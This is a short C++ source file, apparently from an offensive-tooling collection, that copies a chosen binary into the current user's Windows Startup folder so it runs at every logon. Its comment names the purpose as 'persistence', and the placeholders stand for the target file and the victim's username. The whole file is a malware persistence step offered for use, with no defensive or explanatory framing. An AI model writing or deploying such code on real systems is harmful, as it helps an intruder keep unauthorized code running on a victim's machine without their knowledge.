// Just copies the binary to the Startup directory for persistence purposes.
// Raw code, no encoding or encryption

#include <iostream>
#include <windows.h>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

int main() {
    cout << "Pls no copy pasterino!\n";
    
    fs::copy("C:\\<TARGET_DIR>\\<TARGET_FILE>", "C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    
    return 0;
}
